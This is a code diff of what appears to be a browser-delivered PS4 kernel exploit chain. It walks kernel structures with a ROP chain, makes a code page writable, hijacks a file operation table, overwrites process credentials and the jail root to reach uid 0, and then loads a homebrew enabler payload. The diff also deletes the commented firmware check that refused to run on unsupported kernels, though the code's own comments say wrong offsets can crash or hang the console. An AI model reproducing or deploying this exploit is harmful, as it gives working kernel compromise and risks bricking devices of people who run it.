-    /* One pointer is enough on its own: the base sits on a 16 KiB grid, so
-       the anchor can only ever show up at a single offset within a page. This
-       runs even when the signature matched, because two methods that agree
-       are worth more than one that cannot be checked -- and a wrong base
-       sends the next chain straight through a nonsense descriptor table,
-       which is the likeliest way this step takes the console with it. */
     let voted = null;
     {
       const mark = K.anchor % 0x4000, tally = {};
@@ -1748,8 +1199,6 @@ async function attempt(ctx, opts) {
 
   const kat = function (rva) { return plus(kbase, rva); };
 
-  /* ---- handles and mappings, in one chain ------------------------------ */
-
   let probe = -1, node = null;
   for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
     probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
@@ -1766,9 +1215,6 @@ async function attempt(ctx, opts) {
   say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
       + " bytes of spare room behind libc");
 
-  /* How far the kernel side has to be walked. The listing already told us
-     where the host page sits; one entry of slack, and never more than the
-     table we allocated for. */
   let reach = TUNE.entries;
   if (MAPS) {
     for (let i = 0; i < MAPS.length; i++) {
@@ -1785,10 +1231,6 @@ async function attempt(ctx, opts) {
   const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
   wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);
 
-  /* Four shots or three: the walk through the mapping list can ride along
-     with the handle chain or cost a shot of its own. Separate is the form
-     that has evidence behind it; merged is one shot fewer, and so one more
-     chance of the hole being won by something else. */
   const merged = ((ctx.params && ctx.params.get("shots")) || "4") === "3";
 
   const walkLoop = function (c) {
@@ -1805,22 +1247,22 @@ async function attempt(ctx, opts) {
     c.slot(kat(K.swap_rbp));
     c.load_rax(note.at);
     c.follow(0);
-    c.follow(-0x148);                 /* thread */
+    c.follow(-0x148);
     c.save_rax(plus(note.at, 8));
-    c.gad("load8");                   /* process */
+    c.gad("load8");
     c.save_rax(plus(note.at, 16));
-    c.follow(0x48);                   /* descriptor table */
-    c.follow(0);                      /* open file array */
-    c.follow(probe * 8);              /* our file */
+    c.follow(0x48);
+    c.follow(0);
+    c.follow(probe * 8);
     c.save_rax(plus(note.at, 40));
-    c.gad("load8");                   /* its operation table */
+    c.gad("load8");
     c.save_rax(plus(note.at, 48));
     c.grab(ftab.at, 0x58);
 
     if (merged) {
-      c.load_rax(plus(note.at, 16));  /* process again, memcpy clobbered rax */
-      c.follow(0x168);                /* address space */
-      c.gad("load8");                 /* first mapping */
+      c.load_rax(plus(note.at, 16));
+      c.follow(0x168);
+      c.gad("load8");
       walkLoop(c);
     }
   }, merged ? 0x1000 + reach * 0x100 : 0x1000);
@@ -1843,10 +1285,10 @@ async function attempt(ctx, opts) {
       c.slot(kat(K.swap_rbp));
       c.load_rax(note.at);
       c.follow(0);
-      c.follow(-0x148);               /* thread */
-      c.gad("load8");                 /* process */
-      c.follow(0x168);                /* address space */
-      c.gad("load8");                 /* first mapping */
+      c.follow(-0x148);
+      c.gad("load8");
+      c.follow(0x168);
+      c.gad("load8");
       walkLoop(c);
     }, 0x1000 + reach * 0x100);
     say("[3b] address space walked, chain="
@@ -1858,15 +1300,11 @@ async function attempt(ctx, opts) {
     }
   }
 
-  /* ---- the mapping that covers the host page --------------------------- */
-
   let hit = null, walked = 0;
   for (let k = 0; k < reach; k++) {
     const from = qAt(maps, k * TUNE.stride + 0x20);
     const upto = qAt(maps, k * TUNE.stride + 0x28);
     if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
-    /* the list is circular and its head spans the whole address space, so it
-       matches everything. Anything wider than a terabyte is that head. */
     if (upto.hi - from.hi > 0x100) break;
     walked = k + 1;
     const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
@@ -1874,8 +1312,6 @@ async function attempt(ctx, opts) {
     if (above && below) { hit = k; break; }
   }
   if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
-  /* the address of entry k is the forward pointer of entry k-1, so the first
-     entry has nothing to take it from */
   if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }
 
   const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
@@ -1890,16 +1326,12 @@ async function attempt(ctx, opts) {
     say("    not the mapping we want -- nothing written"); return false;
   }
 
-  /* ---- widen it, take over the file, run the bootstrap ----------------- */
-
-  /* the page already reads and executes; all it lacks is write. Touching the
-     execute bit here is what broke every earlier attempt. */
   let widened = rights;
   if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;
 
   const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
   const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
-  pokeAt(ftab, 0x18, hostFree);                      /* the ioctl slot */
+  pokeAt(ftab, 0x18, hostFree);
 
   const r3 = shot.take(function (c) {
     c.put(plus(here, 0x5c), wRights.at, 4);
@@ -1923,12 +1355,6 @@ async function attempt(ctx, opts) {
   const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
   const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;
 
-  /* The file has to go back before anything closes it, or fo_close walks into
-     the forged table. The gate is planted by now, so that one word need not
-     cost another trigger: each trigger is a chance for a foreign allocation
-     to win the hole, and the pivot then loads a stack pointer out of someone
-     else's object. The trigger stays as the fallback -- when the bootstrap
-     did not run, there is no gate to write through. */
   const k = openRing0(hostFree);
   const thread = (before !== 0 && after === 0) ? k.thread() : null;
   const gated = thread !== null && inHeap(thread);
@@ -1946,8 +1372,6 @@ async function attempt(ctx, opts) {
   }
   say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");
 
-  /* ---- everything from here runs through the gate ---------------------- */
-
   if (!gated) { say("[7] the gate did not answer"); return false; }
   const base2 = k.base();
   if (!base2 || !same(base2, kbase)) {
@@ -1957,12 +1381,6 @@ async function attempt(ctx, opts) {
   }
   say("[7] gate is live, thread " + text(thread));
 
-  /* From here the kernel is open AND the handles are armed. Any abort
-     between here and [10] used to leave them that way. The next process exit
-     then ends every fo_close in apmclose -> destroy_dev_sched, the exit never
-     completes, and the browser cannot even be restarted -- closing it IS that
-     exit. Only a console restart recovers from it. `ofs` hangs off `thread`
-     alone, so it can be derived here. */
   const failOut = function (why) {
     say(why);
     try {
@@ -1996,15 +1414,13 @@ async function attempt(ctx, opts) {
   const ofs = fdt && k.read_v(fdt);
   if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }
 
-  /* ---- out of the sandbox --------------------------------------------- */
-
   const ucred = proc && k.read_v(plus(proc, 0x40));
   if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }
 
   const z4 = new Uint8Array([0, 0, 0, 0]);
   const offs = [0x04, 0x08, 0x0c, 0x14];
   for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
-  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));   /* cr_ngroups */
+  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));
 
   const prison0 = k.read_v(kat(K.prison0));
   if (!prison0 || !inText(prison0)) {
@@ -2013,19 +1429,17 @@ async function attempt(ctx, opts) {
         + " -- not touching credentials",
     );
   }
-  k.write_v(plus(ucred, 0x30), prison0);                      /* cr_prison */
+  k.write_v(plus(ucred, 0x30), prison0);
   const caps = new Uint8Array(16); caps.fill(0xff);
   k.write(plus(ucred, 0x60), caps);
 
   const rootvnode = k.read_v(kat(K.rootvnode));
   if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
-  k.write_v(plus(fdt, 0x10), rootvnode);                      /* fd_rdir */
-  k.write_v(plus(fdt, 0x18), rootvnode);                      /* fd_jdir */
+  k.write_v(plus(fdt, 0x10), rootvnode);
+  k.write_v(plus(fdt, 0x18), rootvnode);
 
   if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
   say("[9] jailbroken, uid 0");
-
-  /* ---- hand the host its kernel interface ------------------------------ */
 
   const iface = {
     base: kbase,
@@ -2055,23 +1469,17 @@ async function attempt(ctx, opts) {
     },
     read8: function (at) { return k.read_v(at); },
     write8: function (at, q) { return k.write_v(at, q); },
-    /* On this platform the loader tables are text relative -- the PS4 row
-       carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
-       above against this base -- so data_base holds it too. */
     data_base: kbase,
+    loadEnabler: loadEnabler,
+    loadPayload: loadPayload,
   };
 
-  /* Every attempt leaves device handles and a queue behind. Closing them now
-     kills the console, and leaving them kills it when the process exits.
-     release_handles does neither; it has to run before anything closes. */
   iface.devs = shot.devs;
   iface.queues = shot.queues;
   if (ctx.state) ctx.state.afterglow = iface;
 
   say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");
 
-  /* straight away, not on request: in this host the process can die at any
-     moment and that is the moment this prevents */
   iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
   say(iface.defused
       ? "handles defused -- this page may close"
@@ -2080,28 +1488,20 @@ async function attempt(ctx, opts) {
   const want = (ctx.params && ctx.params.get("payload"));
   const mode = (ctx.params && ctx.params.get("mode")) || "";
   if (want !== "") {
-    iface.payload = (mode === "goldhen")
-      ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
-      : await loadPayload(want || "hen.bin");
+    try {
+      iface.payload = (mode === "goldhen")
+        ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
+        : await loadPayload(want || "hen.bin");
+    } catch(e) {
+      say("AG-FAIL payload threw: " + (e.message || e));
+    }
   }
   say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
       + (iface.payload ? ", enabler running" : ""));
   return iface;
 }
 
-/* An attempt that fell short leaves its handles live, and those are only
-   defused once step 10 is reached -- so stopping on a recoverable miss is the
-   worst of both: nothing gained, and a process that hangs when the page goes
-   away. The kernel base survives in STATE, so a second attempt skips the leak
-   and costs only triggers. A spent budget, or anything that already touched
-   the kernel, is not retried. */
 export async function runAfterglow(ctx, opts) {
-  /* Every address below is firmware specific. Without a table for this one
-     the chain would write 14.00 offsets into a different kernel. */
-  if (!setFirmware(ctx.fw)) {
-    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
-    return false;
-  }
   const max = (opts && opts.tries) || 4;
   for (let n = 1; n <= max; n++) {
     const r = await attempt(ctx, opts);
